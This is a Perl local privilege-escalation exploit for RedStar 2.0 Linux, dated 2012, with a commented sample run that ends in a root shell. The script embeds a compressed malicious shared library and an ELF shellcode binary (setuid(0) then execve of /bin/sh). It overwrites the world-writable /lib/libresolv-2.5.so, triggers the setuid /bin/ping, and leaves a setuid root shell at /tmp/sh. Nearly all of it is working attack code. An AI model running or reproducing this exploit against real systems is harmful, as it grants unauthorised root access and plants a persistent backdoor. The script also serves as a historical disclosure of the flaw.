#!/usr/bin/perl
#
#               N.Korea RedStar 2.0 Linux local root exploit
#
#                                               - 2012.03.30
#
# [user@RedStar2 ~]$ uname -a
# Linux RedStar2 2.6.25-14.rs2.0.i686 #1 SMP Fri Jul 24 19:10:00 KST 2009 i686 i686 i386 GNU/Linux
# [user@RedStar2 ~]$ ls -al /lib/libresolv-2.5.so
# -rwxrwxrwx 1 root root 74612 4ì›”  1 07:08 /lib/libresolv-2.5.so
# [user@RedStar2 ~]$ rpm -qf /lib/libresolv-2.5.so
# glibc-2.5-3.rs2.0
# [user@RedStar2 ~]$ id
# uid=500(user) gid=500(user) groups=500(user)
# [user@RedStar2 ~]$ ./rs-linux-local-root.pl
# RedStar 2.0 Linux (N.Korea) root exploit
#
# [*] Preparing for the attack...
# [-] Checking '/lib/libresolv-2.5.so' file... yes!
# [-] Checking '/bin/ping' file... yes!
# [-] Checking '/usr/bin/bzip2' file... yes!
# [*] Spawn a compressed evil binary.
# [*] Uncompressing a evil binary.
# [*] Create a root shell: /tmp/sh
# [*] Backup the original library.
# [*] Inject evil code into library...
# [*] Do Exploit.........
# [*] Exploit successfully!
# [root@RedStar2 user]# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
# [root@RedStar2 user]# exit
# exit
# [*] Cleanup!
# [*] A ROOT SHELL IS '/tmp/sh'. DELETE IT YOURSELF!
# [user@RedStar2 ~]$ 
#
use Fcntl ":mode";
use IO::Handle;

my $banner = "RedStar 2.0 Linux (N.Korea) root exploit";
my $bz2name = "evil.so.bz2";
my $evil_bin = "evil.so";
my $target = "/lib/libresolv-2.5.so";
my $suidfile = "/bin/ping";
my $backupfile = "libresolv-2.5.so.bak";
my $shellname = "/tmp/sh";

my @cfiles = ($target, $suidfile, "/usr/bin/bzip2");
my @perms = (S_IWOTH, S_ISUID, S_IXOTH);

# pre-compiled evil library
my $bz2bin = 
"\x42\x5A\x68\x39\x31\x41\x59\x26\x53\x59\x91\x83\xB7\xAB\x00\x04".
"\x1F\x7F\xFF\xFF\xFF\xFF\xDE\xD7\x4D\xFD\x56\xFF\xBD\xFF\x7F\xFF".
"\xF7\xFF\xF5\xEE\x7F\x5C\xC6\x4E\x45\xCC\x78\x4D\xA8\x5A\x50\x4A".
"\x7D\xE7\x55\xD0\x04\x94\x4F\x00\x06\x03\x0C\x6A\x1A\x12\x69\xA8".
"\xD4\xCD\x23\x46\x46\xA6\x86\x4D\xA6\x88\xF5\x36\xA6\x09\x81\x34".
"\x03\x40\x03\x43\xD2\x7A\x8D\x03\x11\xA6\x80\x1A\x06\x80\x1A\x34".
"\x34\xD1\xA7\xA8\x18\x87\xA4\x1A\x03\x4D\x34\x64\x1A\x82\x64\x1A".
"\x26\x6A\x60\x4D\x09\xA8\xC8\x34\x00\x03\x01\x06\x8D\x00\x00\x00".
"\x03\x40\x06\x20\x00\x00\x00\x00\x00\x00\x00\x04\x19\x34\xC8\x0C".
"\x23\x21\xA1\x90\x64\x0C\x13\x26\x83\x00\x86\x9A\x68\xC8\x00\xC0".
"\x4C\x99\x32\x62\x0D\x1A\x32\x06\x08\x68\x0D\x34\xD1\xA0\x64\xD0".
"\x68\xC4\x34\x0C\x84\x19\x34\xC8\x0C\x23\x21\xA1\x90\x64\x0C\x13".
"\x26\x83\x00\x86\x9A\x68\xC8\x00\xC0\x4C\x99\x32\x62\x0D\x1A\x32".
"\x06\x08\x68\x0D\x34\xD1\xA0\x64\xD0\x68\xC4\x34\x0C\x81\x22\x24".
"\x13\x44\x99\xA4\xD3\x29\xE8\x9E\xA1\xE9\x34\xC1\x00\x34\xD0\x00".
"\x64\x68\x68\xD3\x40\x00\x68\x00\x64\x69\xA1\xE9\xA8\x34\x00\x00".
"\x06\x86\xD4\x00\x07\xA1\x19\x0F\xF0\x4B\x36\x1E\xF1\x7F\x71\xDD".
"\x61\x5F\x81\x74\x64\x9E\x39\x25\x72\x37\x56\x46\x40\xA6\x40\xC1".
"\xE5\x44\xA4\x62\x5B\x56\x06\x46\xBD\xD3\xA0\xC6\x08\x60\x5F\x42".
"\xA1\x0D\x07\x7B\x0D\x4B\x65\x23\x89\x3E\xB4\x2D\x92\x9A\x7B\x22".
"\x6E\x8D\x4F\xC5\xC4\x4A\xCB\xD8\x6B\x22\xE1\x5D\xE0\xF9\x39\xD8".
"\x7D\x3E\xBF\x6A\x72\xE2\xE6\x54\x97\x44\x83\x20\x35\x7B\x39\xEA".
"\x85\xCF\x56\xBE\x38\x82\xA5\xC2\x00\x7A\xD5\xB6\xB4\x8A\xA8\xE6".
"\x51\x8C\xAB\xDE\x00\x09\x11\xC8\xCC\x51\x92\xC4\xB3\xF1\x3E\x78".
"\x20\x18\x68\x02\x0B\x6C\xAC\xD5\xB9\xB7\x66\x55\x55\x53\x70\xA5".
"\x08\x77\xFA\x37\xED\x94\x33\x66\xB1\x57\x3B\xDE\x0D\x6A\xD5\x9C".
"\x8C\xEA\xB9\x89\x45\xA7\x49\x0D\xC6\xCA\x58\xA4\x74\x57\x32\xE9".
"\x92\x62\x85\x35\x6C\x5D\x1D\x6C\xDB\xF1\xDD\x55\xCA\x43\x72\xF4".
"\xFD\x0C\x21\x82\x2D\x51\x6F\x06\x60\xA2\x46\x64\x21\x6E\xF6\x66".
"\x98\xB7\x51\x49\x41\x08\xA8\xA3\x14\xB0\xE1\x53\x07\xE3\x7F\x33".
"\xB0\x22\xAA\x9A\xA4\x68\x6C\x74\xED\x2E\x6E\xC6\xF8\x97\x23\x88".
"\xE1\x01\x8E\xC5\x2F\x31\xA1\x17\xDA\x44\x34\x0B\x49\x9A\x9C\x01".
"\xCC\x32\x59\x53\x4B\x16\xD2\x1B\x00\x60\xD5\x06\x11\x7A\x1B\x46".
"\x4B\x54\xB6\x0B\x29\x00\x9B\x1B\x49\xB5\x4A\x44\xB6\xD6\x25\x50".
"\x5A\xE8\xD5\x19\x0D\x44\x41\x0E\xFB\x09\x78\xCC\xA9\x81\x6B\x57".
"\x72\x11\x97\xA4\x83\x55\xA6\xAE\x42\x8E\x8E\xE7\x79\xD6\x5E\x8B".
"\xF7\xA6\x7A\x78\xC6\x96\xE3\x6B\x18\x1A\x6C\x28\xC2\xE7\x8A\xE5".
"\xA6\xC6\xEB\x8C\x33\x2E\x6A\x83\x0B\xC0\xD1\x2F\x11\xA2\xB7\x33".
"\x01\x0E\xF6\x6C\x09\x4B\x2E\xB4\x50\x84\x94\xD7\x32\x92\x09\xD5".
"\xC0\x84\x43\x41\x8C\xD1\x0E\x1C\x32\x1C\x34\x36\xD3\x46\xA5\xA2".
"\x1A\x43\x7C\x63\x86\x6A\x3B\x28\x41\xAC\xF5\xE0\x30\x35\xB9\xD9".
"\xE7\xE7\xED\x33\xB6\x1A\xFB\x2B\xDD\xD9\x9D\xBC\xA1\x7A\x94\xD7".
"\xE0\xA9\xA0\xEF\x7B\xED\xB4\x9A\x66\x85\x8D\x89\x6C\xEE\x2F\x1B".
"\x49\x0B\xF8\x90\x8B\xB4\xB0\x82\xFB\x0C\xC6\x08\x36\xE9\x80\x1C".
"\x73\x40\x6B\x53\x4B\xEB\x6B\xB8\x54\xDD\x48\x5A\xD2\x5A\x7C\xFE".
"\x53\x37\x77\xEA\xD6\x96\xAE\xEF\x26\x4F\x71\x89\x5D\x7E\x08\x69".
"\x36\xDE\x77\x05\x8C\xF0\xA4\x41\xF3\x8C\x03\x8B\x1E\xFE\xCA\x3A".
"\x39\x98\xD0\x89\xA4\xFE\xDA\x35\xDB\xB1\x79\x89\x0C\x42\xDD\x64".
"\x6A\x25\x80\xC5\x8F\x09\xC3\x62\xE0\x50\xE1\x3D\x8D\x17\x1F\xF1".
"\x86\x29\x5F\x56\xEA\x65\xFC\x99\x35\xDA\x7F\xA2\x26\x34\x36\xBB".
"\xFA\xF8\x11\x61\x35\xC9\xF6\x94\xB5\xB3\x5C\xD2\xD0\xDC\xFC\x9F".
"\x4C\xD0\x2E\xDF\xC7\x24\xC4\x8C\x2F\x41\x81\xD2\xB0\xC8\x6B\x9E".
"\x69\x6C\x9E\xF3\x85\x86\x51\x6B\xEB\xB5\x31\x4F\x3E\x0B\xC5\x5C".
"\xEC\xF0\xD9\xFC\x52\x1A\xCC\x83\xD3\x74\xC3\x4D\x53\x92\x84\x13".
"\x29\x26\x1C\xFA\xD4\xE0\x6A\x56\x05\xFD\xE3\x8A\x33\x27\x6C\x92".
"\x92\x96\x9A\x9A\x32\xF4\xEA\x8C\x6C\x26\x31\x4C\x2A\x16\xE2\x86".
"\xCD\xE8\xA5\x8D\x8D\x8F\x4F\x32\x3C\x09\xA6\x3C\x47\x1C\x02\x0D".
"\x12\x07\x4C\xA2\x83\x1A\x8A\x2A\x05\x5A\xFC\xDB\x50\x8A\x0C\x67".
"\x8C\x94\x78\x45\x57\x65\x46\x52\x0E\xC7\x42\xC2\xAE\xC8\x71\x58".
"\x17\x65\x6D\x3C\xD1\x0C\x63\x04\x3D\xC6\x27\xD4\x82\xD9\x10\x49".
"\x35\x8D\xBB\xFE\x4B\x41\xFA\x04\xDD\x92\x20\x90\x90\x9E\x31\x73".
"\xA6\x34\x09\x88\x51\xFC\xC5\x2B\x24\x99\xBA\xC4\x7A\x36\x32\xD6".
"\x46\x47\x38\x63\x0A\x59\x3A\xA1\x48\x6B\x3C\xB2\x1E\xC4\xD5\x57".
"\x4A\x35\x6B\x63\xA3\x1C\x9F\xF8\x3D\x59\xB5\xA4\x1B\x4B\xE5\x8C".
"\x1A\xC6\x28\xB1\x46\x39\x87\xB0\x62\x12\xE6\x47\x42\x68\x18\x8E".
"\x75\xEA\x4B\xAB\x03\x40\x1B\x02\xD0\xD5\x14\xD0\x33\x4D\x74\x03".
"\x9B\x8A\x87\xC9\x78\xF8\x4C\x5A\xDC\x9A\xAD\x68\xEF\x10\x14\xED".
"\xEE\x43\xCF\x7A\xE0\x92\x9C\x84\x21\x22\x96\x61\xC3\x42\x0E\xAC".
"\xCC\xC9\xA5\x58\x06\xAC\xE0\x0C\x58\x44\x90\x6A\xEF\xBD\x24\x55".
"\x05\x0F\x52\x83\x68\xA0\x4A\xB0\x4F\x6E\x26\x3F\x45\x81\x5C\xA9".
"\x29\xA3\xC0\x61\x19\xDD\x30\x06\x09\x24\xF6\x00\x94\x65\x3A\x41".
"\x9C\x09\x0A\x64\x3C\x85\x8E\xA7\xDA\xA3\x72\xBF\x33\x24\x0B\x07".
"\x10\x84\xAD\x61\x88\x8E\x3D\x09\x69\x20\xB5\xE0\xEA\x11\x4F\x11".
"\x67\xC0\x3E\x64\x38\x5C\x54\x80\x7D\x04\xC5\xBB\x69\x97\x80\x2A".
"\xC6\x30\xAB\xA3\x2D\x8B\x01\x64\x79\xD7\xBB\x0D\x89\x28\x24\x8E".
"\x4A\x67\x14\x05\x13\xFB\xB4\xCD\xE0\xCA\xC6\x37\x10\x67\xCC\x53".
"\x20\xB7\xEB\x8B\x8F\x91\xC9\xB2\x8E\xA3\x6D\x0F\x08\x9C\xBC\x2F".
"\xED\xB3\xC9\x22\xFD\xAD\x87\x33\x48\xFF\x46\x64\x7C\x09\x59\xC1".
"\xAF\xA6\xC1\x06\x1B\xF6\xCF\xB4\xD5\x6C\xB9\x9A\x5F\xD2\x9F\x96".
"\x5E\xCF\x2A\xC2\x1B\xA9\xA1\xAF\xF2\xAC\x85\x56\x1B\x21\x7E\x0C".
"\xBE\xE5\x85\x6D\x43\x30\x0C\x3B\xC9\x84\x36\x64\xB1\x54\xE5\xF1".
"\x2B\xD6\x5D\x45\x56\x3C\xCE\x63\x3D\x96\x1D\x9B\xF1\x5A\xEE\x71".
"\xB0\x70\xF4\x46\xCD\x16\xF6\xCC\x99\xB0\xB1\x3C\x36\x46\x1C\xD8".
"\xD6\x99\x74\x5B\xE0\x10\x33\xA9\x6F\x77\x4C\xCC\xBA\x80\x59\x47".
"\x10\x69\x6D\xE6\xE1\xAB\xBA\x68\xA3\x06\x5C\x53\x29\xB9\x69\x0C".
"\x16\x62\x0D\x12\xB3\x2A\xE1\xD4\x19\xAD\x45\xDE\x34\x99\x4A\xD2".
"\x64\xFD\x76\xF4\xE2\xEE\x2A\x38\x9B\x0C\x71\x65\x6F\x88\x1B\x17".
"\xFC\xF5\x43\x48\xB3\x93\x68\xDD\x02\x94\x00\x6C\xFC\xA9\x9C\xA4".
"\x98\x81\x0C\x16\x01\xA1\x97\x6C\xCB\x5C\xF0\x66\xB7\xAA\xE4\x40".
"\xCD\xC9\x3C\x3A\xC8\x36\x39\xD6\xB2\x7F\xE2\xEE\x48\xA7\x0A\x12".
"\x12\x30\x76\xF5\x60";

my $shellbin = 
"\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x02\x00\x03\x00\x01\x00\x00\x00\x94\x80\x04\x08\x34\x00\x00\x00".
"\xFC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00".
"\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08".
"\x00\x80\x04\x08\xD6\x00\x00\x00\xD6\x00\x00\x00\x05\x00\x00\x00".
"\x00\x10\x00\x00\x01\x00\x00\x00\xD8\x00\x00\x00\xD8\x90\x04\x08".
"\xD8\x90\x04\x08\x04\x00\x00\x00\x04\x00\x00\x00\x06\x00\x00\x00".
"\x00\x10\x00\x00\x51\xE5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00".
"\x04\x00\x00\x00\x55\x89\xE5\x83\xEC\x18\xA1\xD8\x90\x04\x08\x89".
"\x45\xFC\x8B\x45\xFC\xFF\xD0\xC9\xC3\x00\x00\x00\x31\xC0\x89\xC3".
"\xB0\x2E\xCD\x80\x31\xC0\x89\xC3\xB0\x17\xCD\x80\x31\xC0\x50\x89".
"\xC2\x68\x6E\x2F\x73\x75\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x89".
"\xE1\xB0\x0B\xCD\x80\x00\x00\x00\xAC\x80\x04\x08\x00\x2E\x73\x68".
"\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x2E\x72\x6F".
"\x64\x61\x74\x61\x00\x2E\x64\x61\x74\x61\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00".
"\x94\x80\x04\x08\x94\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00".
"\x01\x00\x00\x00\x02\x00\x00\x00\xAC\x80\x04\x08\xAC\x00\x00\x00".
"\x2A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00".
"\x00\x00\x00\x00\x19\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00".
"\xD8\x90\x04\x08\xD8\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
"\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xDC\x00\x00\x00".
"\x1F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
"\x00\x00\x00\x00";

print $banner . "\n\n";
print "[*] Preparing for the attack...\n";

foreach $file(@cfiles) {
	print "[-] Checking '$file' file... ";
	$ret = permcheck($file, $perms[$i++]);
	if($ret == 0) {
		print "yes!\n";
	} else {
		print "failed.\n";
		exit(0);
	}
}

print "[*] Spawn a compressed evil binary.\n";
unlink($bz2name);
open(BZ2, "> $bz2name") or die("[!] Can't open file.\n");
print(BZ2 $bz2bin) or die("[!] File write error\n");
close(BZ2);

print "[*] Uncompressing a evil binary.\n";
unlink($evil_bin);
system("bzip2 -d $bz2name");

print "[*] Create a root shell: $shellname\n";
unlink($shellname);
open(SHELL, "> $shellname") or die ("[!] Can't open file.\n");
print(SHELL $shellbin) or die("[!] File write error\n");
close(SHELL);

print "[*] Backup the original library.\n";
system("cp -rfa $target $backupfile");

print "[*] Inject evil code into library...\n";
my $pid = fork();
if($pid == 0) {
	exec("sleep 10; $suidfile 2>/dev/null; cat $backupfile > $target");
	exit(0);
}
if($pid == -1) {
	print "[!] fork failed.\n";
	goto cleanup;
}
print "[*] Do Exploit.";
flush STDOUT;
sleep 3;
system("cat $evil_bin > $target");

my $success = 0;
for($i = 0; $i < 60; $i++) {
	print ".";
	flush STDOUT;
	if(($ret = permcheck($shellname, S_ISUID)) == 0) {
		print "\n[*] Exploit successfully!\n";
		$success = 1;
		sleep 1;
		system($shellname);
		last;
	}
	sleep 1;
}

if($success == 0) {
	print "\n[!] Exploit failed.\n";
}

cleanup:
print "[*] Cleanup!\n";

unlink($backupfile);
unlink($evil_bin);

if($success == 1) {
	print "[*] A ROOT SHELL IS '$shellname'. DELETE IT YOURSELF!\n";
}

exit(0);

sub permcheck {
	my $perm;
	$perm = (stat($_[0]))[2];
	if($perm & $_[1]) {
		return 0;
	} else {
		return 1;
	}
}
